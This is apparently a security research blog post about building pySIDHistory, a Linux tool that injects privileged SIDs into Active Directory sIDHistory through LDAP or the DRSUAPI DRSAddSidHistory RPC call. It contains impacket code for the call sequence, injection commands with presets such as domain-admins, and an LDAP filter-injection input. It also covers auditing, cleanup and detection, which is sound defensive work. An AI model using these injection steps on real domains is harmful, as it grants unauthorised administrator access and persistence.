---
title: "pySIDHistory - Building the First Remote SID History Attack Tool for Linux"
date: 2026-02-17
author: "Elliot Belt"
tags: [active-directory, sid-history, impacket, drsuapi, ldap, persistence, python, red-team, blue-team]
categories: [Active Directory, Security Research]
description: "How I built a tool to inject SIDs into Active Directory's sIDHistory attribute remotely from a Linux machine, implementing an undocumented DRSUAPI RPC call that no Python tool had ever used before."
---

# pySIDHistory - Building the First Remote SID History Attack Tool for Linux

*"There is currently no way to exploit this technique purely from a distant UNIX-like machine, as it requires some operations on specific Windows processes' memory."*
— [The Hacker Recipes](https://www.thehacker.recipes/ad/persistence/sid-history)

Challenge accepted.

## Why This Matters

Every Active Directory object has a `sIDHistory` attribute. It was designed for domain migrations — when you move a user from Domain A to Domain B, their old SID gets stored in `sIDHistory` so they can still access resources tied to their old identity.

The catch? When a user authenticates, **every SID in their sIDHistory is added to their access token**, right alongside their real SID and group memberships. If you can inject the `Domain Admins` SID (ending in `-512`) into a regular user's `sIDHistory`, that user becomes a Domain Admin. No group membership changes. No password resets. The access just... appears.

This is [MITRE ATT&CK T1134.005](https://attack.mitre.org/techniques/T1134/005/) — SID-History Injection.

Until now, exploiting it required either:
- **mimikatz** running ON the domain controller with SYSTEM privileges (patching `ntdsa.dll` in memory)
- **DSInternals** with physical access to the `ntds.dit` database file
- **Golden Tickets** with ExtraSids (doesn't persist in AD, only in Kerberos tickets)

All of these are Windows-only. All of them require either local DC access or a pre-compromised `krbtgt` hash.

I wanted to do it **remotely, from Linux, with just domain credentials**.

---

## Understanding the Target: sIDHistory Internals

### The Attribute

`sIDHistory` is defined in the AD schema as:
- **Syntax**: Octet String (binary SID)
- **Multi-valued**: Can contain multiple SIDs
- **systemOnly**: `FALSE`

That last one is interesting. `systemOnly: FALSE` means the schema says this attribute is writable. It's not like `objectSid` (which is `systemOnly: TRUE` and genuinely read-only at the schema level).

So... just LDAP-modify it?

### The Two-Layer Access Control Problem

Active Directory has two access control layers, and this is where things get ugly.

**Layer 1 — LDAP/DSA**: Checks the DACL on the object. If your account has `WriteProperty` on the `sIDHistory` attribute, this layer says "go ahead". You can configure this via delegation, `GenericAll`, or just being a Domain Admin.

**Layer 2 — SAM**: A second layer that intercepts modifications to SAM-owned attributes. This is not configurable via ACLs. The SAM layer enforces a hard rule:

```
MODIFY_ADD    on sIDHistory → BLOCKED (unwillingToPerform)
MODIFY_DELETE on sIDHistory → ALLOWED (if Layer 1 passed)
MODIFY_REPLACE with empty  → ALLOWED (clearing = deletion)
```

You can **remove** SIDs from `sIDHistory` via LDAP. You can **clear** it entirely. But you **cannot add** new SIDs. The SAM layer blocks it regardless of your permissions.

This is why the standard approach requires patching the DC's memory — mimikatz's `sid::patch` disables these SAM checks by overwriting conditional jump instructions in `ntdsa.dll`.

### The Legitimate API

Microsoft actually provides a supported way to add SIDs to `sIDHistory`: the [`DsAddSidHistory`](https://learn.microsoft.com/en-us/windows/win32/ad/using-dsaddsidhistory) Win32 API. Under the hood, it makes an RPC call to the domain controller using the [MS-DRSR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/) protocol — specifically, `IDL_DRSAddSidHistory`, operation number 20 on the DRSUAPI RPC interface.

This is the same RPC interface that `secretsdump.py` uses for DCSync (opnum 3). But opnum 20 had never been implemented in Python. Until now.

---

## The Architecture

I designed pySIDHistory with two injection methods:

```
                    ┌──────────────────────────────┐
                    │        pySIDHistory           │
                    │     (sidhistory.py CLI)       │
                    └──────────────┬───────────────┘
                                   │
                    ┌──────────────┴───────────────┐
                    │                               │
              ┌─────┴─────┐                  ┌─────┴──────┐
              │   LDAP    │                  │  DRSUAPI   │
              │  Method   │                  │  Method    │
              └─────┬─────┘                  └─────┬──────┘
                    │                               │
          ┌────────┴────────┐              ┌───────┴────────┐
          │ ldap3 library   │              │ impacket RPC   │
          │ MODIFY_ADD/DEL  │              │ opnum 20       │
          │ Port 389/636    │              │ Port 135→dyn   │
          └────────┬────────┘              └───────┬────────┘
                    │                               │
                    └──────────┬────────────────────┘
                               │
                    ┌──────────┴───────────┐
                    │   Domain Controller  │
                    │   sIDHistory attr    │
                    └──────────────────────┘
```

**LDAP method**: Direct attribute modification. Works for **removal and clearing** (blue team operations). Adding is blocked by the SAM layer on standard DCs, but works in specific misconfigurations or after mimikatz patching.

**DRSUAPI method**: The legitimate `DRSAddSidHistory` RPC call (opnum 20). This is the proper way to add SIDs, but requires specific conditions (cross-forest, auditing enabled, Domain Admin privileges).

Both methods share the same authentication, LDAP operations, scanning, and output modules.

---

## Implementing DRSAddSidHistory: The Hard Part

### Step 1: Understanding the Protocol

The [MS-DRSR specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/376230a5-d806-4ae5-970a-f6243ee193c8) defines the IDL:

```c
ULONG IDL_DRSAddSidHistory(
    [in, ref] DRS_HANDLE hDrs,           // From DRSBind
    [in] DWORD dwInVersion,              // Must be 1
    [in, ref, switch_is(dwInVersion)]
        DRS_MSG_ADDSIDREQ *pmsgIn,       // Request
    [out, ref] DWORD *pdwOutVersion,     // Returns 1
    [out, ref, switch_is(*pdwOutVersion)]
        DRS_MSG_ADDSIDREPLY *pmsgOut     // Response (just a Win32 error)
);
```

The request structure is `DRS_MSG_ADDSIDREQ_V1`:

```c
typedef struct {
    DWORD Flags;                    // 0 = cross-forest, 0x80000000 = same-domain
    [string] WCHAR *SrcDomain;      // Source domain FQDN
    [string] WCHAR *SrcPrincipal;   // Source user (SAM name or DN)
    [string, ptr] WCHAR *SrcDomainController;  // Source PDC (optional)
    [range(0,256)] DWORD SrcCredsUserLength;
    [size_is(SrcCredsUserLength)] WCHAR *SrcCredsUser;
    [range(0,256)] DWORD SrcCredsDomainLength;
    [size_is(SrcCredsDomainLength)] WCHAR *SrcCredsDomain;
    [range(0,256)] DWORD SrcCredsPasswordLength;
    [size_is(SrcCredsPasswordLength)] WCHAR *SrcCredsPassword;
    [string] WCHAR *DstDomain;      // Destination domain FQDN
    [string] WCHAR *DstPrincipal;   // Destination user
} DRS_MSG_ADDSIDREQ_V1;
```

And the response is beautifully simple:

```c
typedef struct {
    DWORD dwWin32Error;  // 0 = success
} DRS_MSG_ADDSIDREPLY_V1;
```

### Step 2: NDR Structures in impacket

impacket uses a Python-based NDR framework. Each RPC call is defined as a pair of classes:

```python
class DRSAddSidHistory(NDRCALL):
    opnum = 20  # This maps to IDL_DRSAddSidHistory
    structure = (
        ('hDrs', drsuapi.DRS_HANDLE),
        ('dwInVersion', DWORD),
        ('pmsgIn', DRS_MSG_ADDSIDREQ_V1),
    )

class DRSAddSidHistoryResponse(NDRCALL):
    structure = (
        ('pdwOutVersion', DWORD),
        ('pmsgOut', DRS_MSG_ADDSIDREPLY_V1),
        ('ErrorCode', DWORD),
    )
```

When you call `dce.request(request)`, impacket:
1. Serializes the request structure to NDR binary format
2. Sends it as an RPC request with opnum 20
3. Deserializes the response using `DRSAddSidHistoryResponse`

The `opnum = 20` attribute is the entire dispatch mechanism — impacket routes it to the right server-side function.

### Step 3: The DRSBind Capability Flag

This one wasn't documented anywhere except deep in the MS-DRSR spec. When calling `DRSBind` (opnum 0), the client sends capability flags in `DRS_EXTENSIONS_INT.dwFlags`. To use opnum 20, you **must** include `DRS_EXT_ADD_SID_HISTORY` (0x00040000):

```python
drs['dwFlags'] = (
    drsuapi.DRS_EXT_GETCHGREQ_V6 |      # Standard DCSync flags
    drsuapi.DRS_EXT_GETCHGREPLY_V6 |
    drsuapi.DRS_EXT_GETCHGREQ_V8 |
    drsuapi.DRS_EXT_STRONG_ENCRYPTION |
    0x00040000                            # DRS_EXT_ADD_SID_HISTORY
)
```

Without this flag, the DC silently rejects opnum 20 calls. impacket doesn't define this constant because they never implemented opnum 20 — I had to dig it out of the [DRS_EXTENSIONS_INT specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/3ee529b1-23db-4996-948a-042f04998e91).

### Step 4: The Credential Array Problem

The `SrcCredsUser`, `SrcCredsDomain`, and `SrcCredsPassword` fields are conformant arrays with `size_is()` — their length is determined by a preceding DWORD field. In NDR, this means the array header contains max count, offset, and actual count values derived from the length field.

For the common case where you don't provide separate source credentials (the DC uses your caller credentials), these must be NULL:

```python
request['pmsgIn']['SrcCredsUserLength'] = 0
request['pmsgIn']['SrcCredsUser'] = NULL  # impacket NDRPOINTERNULL
request['pmsgIn']['SrcCredsDomainLength'] = 0
request['pmsgIn']['SrcCredsDomain'] = NULL
request['pmsgIn']['SrcCredsPasswordLength'] = 0
request['pmsgIn']['SrcCredsPassword'] = NULL
```

Getting this wrong causes `ERROR_INVALID_PARAMETER` (87) from the DC with no further explanation.

### Step 5: The Full Call Sequence

```python
# 1. Resolve DRSUAPI endpoint via EPM (port 135)
string_binding = epm.hept_map(dc_ip, drsuapi.MSRPC_UUID_DRSUAPI,
                               protocol='ncacn_ip_tcp')

# 2. Create RPC transport with encryption
rpc = transport.DCERPCTransportFactory(string_binding)
rpc.set_credentials(username, password, domain, lm_hash, nt_hash)
dce = rpc.get_dce_rpc()
dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)  # 128-bit encryption
dce.connect()
dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

# 3. DRSBind with ADD_SID_HISTORY capability
request = drsuapi.DRSBind()
# ... (set extensions with 0x00040000 flag)
resp = dce.request(request)
hDrs = resp['phDrs']

# 4. DRSAddSidHistory
request = DRSAddSidHistory()
request['hDrs'] = hDrs
request['dwInVersion'] = 1
request['pmsgIn']['Flags'] = 0  # Cross-forest variant
request['pmsgIn']['SrcDomain'] = 'source.forest.local\x00'
request['pmsgIn']['SrcPrincipal'] = 'SourceAdmin\x00'
request['pmsgIn']['DstDomain'] = 'dest.forest.local\x00'
request['pmsgIn']['DstPrincipal'] = 'TargetUser\x00'
# ... (NULL credentials)
resp = dce.request(request)

win32_error = resp['pmsgOut']['dwWin32Error']
# 0 = success, anything else = see error table
```

---

## The Bugs I Found in the Original Code

Before implementing DRSUAPI, I reviewed the existing LDAP-based code and found 8 bugs. Some were security vulnerabilities.

### Bug 1: LDAP Injection (Security)

```python
# BEFORE (vulnerable)
search_filter = f"(sAMAccountName={sam_account_name})"
```

If someone passes `admin)(objectClass=*` as the username, this becomes `(sAMAccountName=admin)(objectClass=*)` and returns every object in the domain.

```python
# AFTER (safe)
from ldap3.utils.conv import escape_filter_chars
safe_name = escape_filter_chars(sam_account_name)
search_filter = f"(sAMAccountName={safe_name})"
```

This was present in 3 separate functions. All fixed.

### Bug 2: Pass-the-Hash Was Silently Broken

ldap3 doesn't support NTLM Pass-the-Hash. The original code passed the hash as a password string:

```python
password = f"{lm_hash}:{nt_hash}"
connection = Connection(server, password=password, authentication=NTLM)
```

ldap3 hashes this string again, producing `NTLM(lm_hash + ":" + nt_hash)` — which obviously doesn't match the original hash. Authentication fails silently (or succeeds against the wrong credentials).

**Fix**: Use impacket's LDAP client for the actual NTLM auth, store credentials for DRSUAPI reuse.

### Bug 3: Certificate Auth Without SASL Mechanism

```python
# BEFORE
connection = Connection(server, authentication=SASL, auto_bind=True)
# No sasl_mechanism specified — ldap3 doesn't know what to use
```

```python
# AFTER
connection = Connection(server, authentication=SASL,
                       sasl_mechanism='EXTERNAL', auto_bind=True)
# EXTERNAL = server identifies client from TLS certificate
```

### Bug 4: Wrong Parser in Validation

```python
# BEFORE
validate_arguments(args, auth_method, argparse.ArgumentParser())
# Creates a NEW empty parser — error messages show wrong program name
```

```python
# AFTER
parser, args = parse_arguments()  # Return the actual parser
validate_arguments(args, auth_method, parser)
```

### Bug 5: Unsafe disconnect()

`connection.unbind()` raises an exception if the connection is already closed (timeout, network error). The `finally` block in `main()` would crash instead of cleaning up.

```python
# AFTER
def disconnect(self):
    if self.connection:
        try:
            self.connection.unbind()
        except Exception:
            pass
        finally:
            self.connection = None
```

### Bug 6: Fragile sIDHistory Detection

```python
# BEFORE
if not hasattr(entry, 'sIDHistory'):  # Always True with ldap3
    return []
```

ldap3 entry objects always have attributes that were requested, even if empty. `hasattr` returns True for empty attributes.

```python
# AFTER
try:
    raw_values = entry.sIDHistory.raw_values
    if not raw_values:
        return []
except Exception:
    return []
```

### Bug 7-8: Non-Atomic Operations + Missing Error Hints

The original code read the full sIDHistory, appended/removed in Python, then wrote back the entire list. This is a race condition in multi-admin environments.

**Fix**: `MODIFY_ADD` for single-SID additions, `MODIFY_DELETE` for removals. Plus detailed error hints for the AD-specific error codes (`insufficientAccessRights`, `unwillingToPerform`, `constraintViolation`).

---

## Blue Team Features

Half of this tool is offensive. The other half is for defenders.

### Domain-Wide Audit

```bash
python3 sidhistory.py -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --audit
```

Scans every object in the domain for `sIDHistory` entries, then analyzes each one:

```
======================================================================
  SID History Audit Report - CORP.LOCAL
======================================================================
  Domain SID: S-1-5-21-111111-222222-333333
  Objects with sIDHistory: 3

  Risk Summary:
    CRITICAL  : 2
    LOW       : 1

  Total sIDHistory entries : 4
  Same-domain SIDs        : 2
  Privileged SIDs         : 2
  Cross-domain SIDs       : 1
──────────────────────────────────────────────────────────────────────

  [CRITICAL] jdoe (user)
    DN  : CN=John Doe,OU=Users,DC=corp,DC=local
    SID : S-1-5-21-111111-222222-333333-1105
    sIDHistory: S-1-5-21-111111-222222-333333-512 (Domain Admins)
    > SAME-DOMAIN SID: S-1-5-21-111111-222222-333333-512 (Domain Admins)
      - This is likely an attack, not a legitimate migration
    > PRIVILEGED SID: S-1-5-21-111111-222222-333333-512 (Domain Admins)
      - Grants Domain Admins privileges
```

The **same-domain SID detection** is the killer feature for defenders. Legitimate sIDHistory comes from migrations (different domain). Same-domain SIDs in sIDHistory are almost always attack indicators.

### Output Formats

```bash
# JSON for SIEM ingestion
python3 sidhistory.py ... --audit -o json --output-file audit.json

# CSV for spreadsheets
python3 sidhistory.py ... --audit -o csv --output-file audit.csv
```

### Cleanup Operations

```bash
# Clear all sIDHistory (nuclear option)
python3 sidhistory.py ... --target compromised_user --clear

# Remove only same-domain SIDs (preserve legitimate migration SIDs)
python3 sidhistory.py ... --target compromised_user --clean-same-domain

# Bulk cleanup from file
python3 sidhistory.py ... --targets-file compromised_users.txt --bulk-clear
```

### Detection References

| Event ID | Description | When |
|----------|-------------|------|
| **4765** | SID History added to an account | DsAddSidHistory succeeded |
| **4766** | SID History add failed | DsAddSidHistory was attempted but failed |
| **4738** | User account changed | Any attribute modification including sIDHistory |
| **4742** | Computer account changed | Computer sIDHistory modified |

Monitor for Event 4765/4766 — these are **specific** to SID History operations and should be extremely rare in production.

---

## Feature Overview

### Attack Operations

| Feature | Command | Description |
|---------|---------|-------------|
| Inject via preset | `--target X --preset domain-admins` | Auto-builds the SID from domain SID + RID |
| Inject via SID | `--target X --sid S-1-5-21-...` | Direct SID injection |
| Inject via name | `--target X --source-user Administrator` | Resolves name to SID first |
| Cross-domain | `--source-domain OTHER.LOCAL` | Looks up SID in trusted domain |
| DRSUAPI method | `--method drsuapi` | Uses RPC instead of LDAP |
| Bulk inject | `--targets-file users.txt --sid ...` | Multiple targets from file |
| Copy history | `--target X --copy-from Y` | Copies sIDHistory between objects |

### 10 Available Presets

```
administrator          → S-1-5-21-<domain>-500
administrators         → S-1-5-32-544 (BUILTIN)
domain-admins          → S-1-5-21-<domain>-512
domain-controllers     → S-1-5-21-<domain>-516
enterprise-admins      → S-1-5-21-<domain>-519
enterprise-key-admins  → S-1-5-21-<domain>-527
group-policy-creators  → S-1-5-21-<domain>-520
key-admins             → S-1-5-21-<domain>-526
krbtgt                 → S-1-5-21-<domain>-502
schema-admins          → S-1-5-21-<domain>-518
```

### Defense Operations

| Feature | Command | Description |
|---------|---------|-------------|
| Full audit | `--audit` | Scan all objects, risk assessment |
| Query single | `--query victim` | Show sIDHistory with enrichment |
| Enumerate trusts | `--enum-trusts` | List trusts + SID filtering status |
| Clear history | `--target X --clear` | Remove all sIDHistory |
| Clean same-domain | `--target X --clean-same-domain` | Remove attack SIDs, keep migration SIDs |
| Bulk clear | `--targets-file X --bulk-clear` | Mass cleanup |
| Dry run | `--dry-run` | Preview changes without modifying |

### Authentication

5 methods: NTLM (password), Pass-the-Hash, Kerberos (ccache), Certificate (LDAPS), SIMPLE bind.

### Output

3 formats: Console (colored + risk indicators), JSON (SIEM), CSV (spreadsheets).

---

## What Makes This Different

1. **First Python implementation of `IDL_DRSAddSidHistory` (opnum 20)** — No existing Python tool or library had this. impacket doesn't ship it. We built the NDR structures from the MS-DRSR specification.

2. **Dual-method approach** — LDAP for reads/removals (always works), DRSUAPI for adds (the legitimate API). Not either/or — both.

3. **Same-domain SID detection** — The single most reliable indicator of SID History abuse. If `sIDHistory` contains a SID from the same domain as the object, it's an attack.

4. **Works from Linux** — No Windows required. No mimikatz. No ntds.dit access. Just network connectivity and domain credentials.

5. **Both offense and defense** — One tool for red team injection and blue team auditing/cleanup.

---

## Limitations & Honest Assessment

**LDAP ADD will fail on standard DCs.** The SAM layer blocks it. This is by design. The LDAP method is primarily useful for read/remove operations (blue team) and for environments where the DC has been previously patched (post-exploitation).

**DRSUAPI cross-forest variant requires a real cross-forest setup** — source and destination must be in different forests, auditing must be enabled on both sides, and the caller must be Domain Admin in the destination.

**The DRSUAPI same-domain variant (`DEL_SRC_OBJ`) deletes the source object.** This is inherent to the protocol — the DC copies the SID then deletes the source. You'd need a sacrificial account.

**NDR serialization hasn't been tested against every DC version.** The structures match the MS-DRSR spec exactly, but edge cases in NDR encoding could cause issues on specific Windows Server versions.

---

## References

- [MS-DRSR: IDL_DRSAddSidHistory (Opnum 20)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/376230a5-d806-4ae5-970a-f6243ee193c8) — The RPC call specification
- [MS-DRSR: DRS_MSG_ADDSIDREQ_V1](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/50b7cc92-608c-44ac-9d3e-48e2112c9bc0) — Request structure
- [MS-DRSR: Server Behavior](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/fbc94975-28ef-4334-bb47-35708a15d586) — How the DC processes the call
- [Using DsAddSidHistory (Win32)](https://learn.microsoft.com/en-us/windows/win32/ad/using-dsaddsidhistory) — Prerequisites and requirements
- [The Hacker Recipes: SID History](https://www.thehacker.recipes/ad/persistence/sid-history) — Technique overview
- [MITRE ATT&CK T1134.005](https://attack.mitre.org/techniques/T1134/005/) — Technique classification
- [impacket](https://github.com/fortra/impacket) — Python RPC/LDAP framework
- [mimikatz sid:: module](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_sid.c) — Memory patching approach
- [Dirkjan Mollema: SID Filtering](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/) — Trust security internals
- [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) — Offline ntds.dit approach
- [Impacket Developer Guide (RPC)](https://cicada-8.medium.com/impacket-developer-guide-part-1-rpc-4df4fe6d79d7) — How to extend impacket
